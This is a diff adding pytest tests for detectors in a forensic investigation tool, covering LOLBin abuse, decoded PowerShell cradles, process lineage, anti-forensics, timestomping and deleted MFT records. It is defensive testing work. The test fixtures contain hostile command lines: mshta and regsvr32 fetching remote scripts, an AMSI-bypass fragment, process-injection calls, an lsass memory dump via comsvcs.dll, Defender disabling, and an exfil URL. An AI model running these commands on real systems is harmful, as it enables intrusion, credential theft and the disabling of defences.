@@ -849,3 +849,268 @@ class TestV2BackwardCompat:
         monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
         with pytest.raises(EgressBlocked):
             assert_local("https://api.anthropic.com/v1/messages")
+
+
+# ============================================================================
+# Detection Depth — fileless / LOLBin / lineage / anti-forensics / deleted-MFT.
+# Each detector is deterministic, carries provenance (host + event/artifact), is
+# air-gapped (base64 decode is local; the LOLBin ruleset is static in-repo), and
+# is wired into ATT&CK + root cause. Tests prove it finds the real artifact AND
+# stays quiet on its absence, exactly like the rest of the suite.
+# ============================================================================
+from afa.tools import (analyze_command_intent, detect_lineage_anomalies, detect_lolbins,
+                       detect_timestomping)
+
+# event keys the strict ATT&CK rules index directly; an inline event must carry them.
+_EK = ("ts", "event_id", "channel", "computer", "user", "process", "parent_process",
+       "cmdline", "dst_ip", "detail")
+
+
+def _evt(**kw):
+    base = {k: "" for k in _EK}
+    base["event_id"] = 0
+    base.update(kw)
+    return base
+
+
+def _ev_cmd(cmdline, process="", parent="", **kw):
+    """An Evidence carrying a single 4688 command-line event (all keys present)."""
+    return Evidence(host_name="EVAS-1", events=[_evt(
+        event_id=4688, computer="EVAS-1", ts="2026-05-02T10:00:00Z",
+        process=process, parent_process=parent, cmdline=cmdline, detail="")])
+
+
+class TestLolbinDetection:
+    def test_certutil_download_detected_from_sample(self):
+        ev, _ = load_package(PKG)
+        r = detect_lolbins(ev)
+        certutil = [i for i in r["items"] if i["binary"] == "certutil"]
+        assert certutil and "T1105" in certutil[0]["techniques"]
+        assert "198.51.100.23" in certutil[0]["command"]      # provenance: the real cmdline
+        assert "WEB-03" in certutil[0]["provenance"] and "event 4688" in certutil[0]["provenance"]
+
+    def test_mshta_and_regsvr32_squiblydoo(self):
+        mshta = detect_lolbins(_ev_cmd("mshta.exe http://198.51.100.50/a.hta", "mshta.exe"))
+        assert mshta["items"][0]["binary"] == "mshta" and "T1218.005" in mshta["items"][0]["techniques"]
+        sq = detect_lolbins(_ev_cmd('regsvr32 /s /u /i:http://198.51.100.50/a.sct scrobj.dll', "regsvr32.exe"))
+        techs = sq["items"][0]["techniques"]
+        assert "T1218.010" in techs and "T1105" in techs      # squiblydoo + remote fetch
+
+    def test_lolbin_mapped_into_attack_matrix(self):
+        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
+        assert {"T1105", "T1140"} <= ids                       # certutil download + decode/deobf
+
+    def test_clean_signed_binary_use_is_not_flagged(self):
+        # certutil used benignly (no urlcache/decode/http) must not trip the rule
+        assert detect_lolbins(_ev_cmd("certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256"))["count"] == 0
+        assert detect_lolbins(Evidence(host_name="CLEAN"))["count"] == 0
+
+
+class TestCommandIntentDeobfuscation:
+    def test_encodedcommand_is_decoded_and_classified(self):
+        ev, _ = load_package(PKG)
+        r = analyze_command_intent(ev)
+        assert r["decoded_count"] >= 1
+        cradle = [i for i in r["items"] if "download_cradle" in i["intent"] and i["decoded"]]
+        assert cradle, "the -EncodedCommand cradle should decode and classify"
+        c = cradle[0]
+        assert "downloadstring" in c["decoded"].lower() and "198.51.100.23" in c["decoded"]
+        assert c["obfuscated"] and "base64-encoded command" in c["obfuscation"]
+        assert "T1140" in c["techniques"] and "T1105" in c["techniques"]
+        assert "WEB-03" in c["provenance"]
+
+    def test_intent_maps_to_deobfuscation_and_obfuscation_techniques(self):
+        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
+        assert {"T1027", "T1140"} <= ids
+
+    def test_amsi_bypass_and_injection_intent(self):
+        amsi = analyze_command_intent(_ev_cmd(
+            "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "powershell.exe"))
+        assert any("T1562.001" in i["techniques"] for i in amsi["items"])
+        inj = analyze_command_intent(_ev_cmd(
+            "powershell $x=VirtualAlloc(0,0x1000,0x3000,0x40); WriteProcessMemory(...)", "powershell.exe"))
+        assert any("T1055" in i["techniques"] for i in inj["items"])
+
+    def test_clean_command_no_false_positive(self):
+        assert analyze_command_intent(_ev_cmd("ipconfig /all", "ipconfig.exe"))["count"] == 0
+        assert analyze_command_intent(_ev_cmd("cmd /c dir C:\\Users", "cmd.exe"))["count"] == 0
+
+
+class TestLineageAnomalies:
+    def test_office_spawning_powershell_is_flagged(self):
+        ev = _ev_cmd("powershell -enc AAAA", "powershell.exe", parent="winword.exe")
+        r = detect_lineage_anomalies(ev)
+        assert r["count"] == 1
+        assert "T1566.001" in r["items"][0]["techniques"]
+        assert "winword.exe" in r["items"][0]["provenance"] and "EVAS-1" in r["items"][0]["provenance"]
+
+    def test_web_server_spawning_shell_in_sample(self):
+        ev, _ = load_package(PKG)                              # WEB-03 has w3wp.exe -> cmd.exe
+        r = detect_lineage_anomalies(ev)
+        ws = [i for i in r["items"] if i["parent"] == "w3wp.exe"]
+        assert ws and "T1059.003" in ws[0]["techniques"]
+
+    def test_lsass_access_is_credential_dumping(self):
+        ev = _ev_cmd("rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
+                     "rundll32.exe")
+        r = detect_lineage_anomalies(ev)
+        assert any("T1003.001" in i["techniques"] for i in r["items"])
+
+    def test_normal_lineage_is_not_flagged(self):
+        ev = Evidence(host_name="N", processes=[
+            {"pid": 10, "ppid": 4, "name": "explorer.exe", "path": "", "cmdline": "explorer.exe"},
+            {"pid": 11, "ppid": 10, "name": "chrome.exe", "path": "", "cmdline": "chrome.exe"}])
+        assert detect_lineage_anomalies(ev)["count"] == 0
+
+
+class TestAntiForensicsDeepened:
+    def test_vss_usn_and_log_clear_each_flagged_and_mapped(self):
+        ev, _ = load_package(PKG)
+        af = detect_antiforensics(ev)
+        labels = {i["label"] for i in af["items"]}
+        assert any("VSS shadow-copy deletion" == l for l in labels)
+        assert any("USN change-journal deletion" == l for l in labels)
+        assert any("cleared" in l.lower() for l in labels)
+        # provenance: every finding names its source row
+        assert all(i["provenance"] for i in af["items"])
+        ids = {t["id"] for t in map_attack(ev)["techniques"]}
+        assert {"T1490", "T1070", "T1070.001"} <= ids          # recovery-inhibit, USN, log-clear
+
+    def test_defender_tampering_mapped(self):
+        ids = {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
+        assert "T1562.001" in ids
+        r = detect_antiforensics(_ev_cmd(
+            "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "powershell.exe"))
+        assert any("T1562.001" in i["techniques"] for i in r["items"])
+
+    def test_blind_spot_window_reported_into_rootcause_gaps(self):
+        recon = build_reconstruction(load_package(PKG)[0])
+        gaps = recon["gaps"]
+        assert any("Visibility gap" in g and "before this are unavailable" in g for g in gaps)
+        assert any("Shadow Copies were deleted" in g for g in gaps)
+        assert any("USN change journal was deleted" in g for g in gaps)
+
+    def test_clean_host_has_no_antiforensics(self):
+        assert detect_antiforensics(Evidence(host_name="CLEAN"))["count"] == 0
+
+
+class TestTimestompDetection:
+    def test_si_before_fn_is_flagged(self):
+        ev, _ = load_package(PKG)
+        r = detect_timestomping(ev)
+        assert r["count"] == 1
+        item = r["items"][0]
+        assert item["path"].lower().endswith("update.sys")
+        assert any("precedes FN-created" in why for why in item["reasons"])
+        assert "T1070.006" in item["techniques"]
+        assert "update.sys" in item["provenance"]
+
+    def test_normal_row_is_not_flagged(self):
+        ev = Evidence(host_name="N", filesystem=[{
+            "path": "C:\\x.txt", "name": "x.txt",
+            "created": "2026-05-02T09:00:00Z", "modified": "2026-05-02T09:00:00Z",
+            "fn_created": "2026-05-02T09:00:00Z", "fn_modified": "2026-05-02T09:00:00Z"}])
+        assert detect_timestomping(ev)["count"] == 0
+
+    def test_absent_fn_timestamps_no_crash_no_false_positive(self):
+        # rows without $FILE_NAME (0x30) data — older packages / generic listing
+        ev = Evidence(host_name="N", filesystem=[{
+            "path": "C:\\Users\\Public\\evil.exe", "name": "evil.exe",
+            "created": "2009-01-01T00:00:00Z", "modified": "2009-01-01T00:00:00Z"}])
+        assert detect_timestomping(ev)["count"] == 0           # cannot compare -> skip, no FP
+        assert "T1070.006" not in {t["id"] for t in map_attack(ev)["techniques"]}
+
+    def test_timestomp_mapped_and_in_rootcause_gaps(self):
+        recon = build_reconstruction(load_package(PKG)[0])
+        assert "T1070.006" in {t["id"] for t in map_attack(load_package(PKG)[0])["techniques"]}
+        assert any("Timestomping detected" in g for g in recon["gaps"])
+
+
+class TestDeletedMftRecords:
+    def test_inuse_false_record_is_flagged_deleted(self):
+        ev, _ = load_package(PKG)
+        ft = filesystem_timeline(ev)
+        assert ft["deleted_count"] >= 1
+        del_paths = [d["path"] for d in ft["deleted_suspicious"]]
+        assert any(p.lower().endswith("stage2.exe") for p in del_paths)
+        # tied to anti-forensics (file deletion) in the ATT&CK matrix
+        assert "T1070.004" in {t["id"] for t in map_attack(ev)["techniques"]}
+        # and surfaced as a deleted-dropper IOC + gap in root cause
+        recon = build_reconstruction(ev)
+        assert any("stage2.exe" in p for p in recon["iocs"]["suspicious_paths"])
+        assert any("Deleted $MFT record" in g for g in recon["gaps"])
+
+    def test_inuse_column_parsed_from_mftecmd_csv(self, tmp_path):
+        p = tmp_path / "mft.csv"
+        p.write_text("ParentPath,FileName,Created0x10,Created0x30,FileSize,InUse\n"
+                     "C:\\Users\\Public,gone.exe,2026-05-02 09:11:50,2026-05-02 09:11:50,4096,False\n"
+                     "C:\\Users\\Public,here.exe,2026-05-02 09:11:50,2026-05-02 09:11:50,4096,True\n")
+        rows = normalize_mft(p)
+        gone = next(r for r in rows if r["name"] == "gone.exe")
+        here = next(r for r in rows if r["name"] == "here.exe")
+        assert gone["deleted"] is True and here["deleted"] is False
+        assert gone["fn_created"].startswith("2026-05-02T09:11")   # 0x30 carried through
+
+    def test_absent_inuse_defaults_to_not_deleted(self, tmp_path):
+        p = tmp_path / "mft.csv"
+        p.write_text("ParentPath,FileName,Created0x10,FileSize\n"
+                     "C:\\Users\\Public,x.exe,2026-05-02 09:11:50,4096\n")
+        rows = normalize_mft(p)
+        assert rows[0]["deleted"] is False                     # no InUse column -> default False
+        assert rows[0]["fn_created"] == ""                     # no 0x30 -> empty, no crash
+
+
+class TestDetectionDepthProvenanceAndGrounding:
+    def test_every_detector_finding_carries_provenance(self):
+        ev, _ = load_package(PKG)
+        for tool in (detect_lolbins, analyze_command_intent, detect_lineage_anomalies,
+                     detect_timestomping, detect_antiforensics):
+            for item in tool(ev)["items"]:
+                assert item.get("provenance"), f"{tool.__name__} finding lacks provenance"
+
+    def test_new_tools_are_registered_for_the_agent(self):
+        from afa.tools import tool_names, tool_specs
+        names = set(tool_names())
+        assert {"detect_lolbins", "analyze_command_intent", "detect_lineage_anomalies",
+                "detect_timestomping"} <= names
+        spec_names = {s["function"]["name"] for s in tool_specs()}
+        assert "detect_lolbins" in spec_names
+
+    def test_offline_planner_routes_to_new_detectors_and_stays_grounded(self):
+        p = OfflinePlanner()
+        for q, tool in [("Was there any LOLBin / certutil abuse?", "detect_lolbins"),
+                        ("Decode the obfuscated PowerShell command", "analyze_command_intent"),
+                        ("Any anomalous process lineage?", "detect_lineage_anomalies"),
+                        ("Was any file timestomped?", "detect_timestomping"),
+                        ("Did they delete shadow copies?", "detect_antiforensics")]:
+            a = p.investigate(q, load_package(PKG)[0])
+            assert a.grounded and any(t.name == tool for t in a.tool_calls), q
+
+    def test_clean_host_yields_none_of_the_new_techniques(self):
+        ids = {t["id"] for t in map_attack(Evidence(host_name="CLEAN-DD"))["techniques"]}
+        new = {"T1218", "T1218.005", "T1218.010", "T1047", "T1140", "T1027", "T1055",
+               "T1490", "T1070", "T1070.004", "T1070.006", "T1566.001", "T1003.001"}
+        assert not (new & ids)
+
+
+class TestDetectionDepthBackwardCompat:
+    def test_package_without_scriptblocks_or_fn_still_analyzes(self):
+        # a minimal package: no 4104 logs, no FN timestamps, no InUse column
+        ev = Evidence(
+            host_name="OLD-1",
+            events=[_evt(event_id=4688, computer="OLD-1", ts="2026-01-01T00:00:00Z",
+                         process="cmd.exe", cmdline="cmd /c whoami")],
+            filesystem=[{"path": "C:\\Users\\Public\\a.exe", "name": "a.exe",
+                         "created": "2026-01-01T00:00:00Z", "modified": "2026-01-01T00:00:00Z"}])
+        # detectors degrade gracefully — fewer findings, never a crash
+        assert detect_timestomping(ev)["count"] == 0
+        assert filesystem_timeline(ev)["deleted_count"] == 0
+        assert analyze_command_intent(ev)["count"] == 0
+        recon = build_reconstruction(ev)                       # must not raise
+        assert "gaps" in recon
+        build_brief(ev)                                        # must not raise
+
+    def test_egress_guard_unaffected_by_detection_depth(self, monkeypatch):
+        monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
+        with pytest.raises(EgressBlocked):
+            assert_local("https://evil.example.test/exfil")
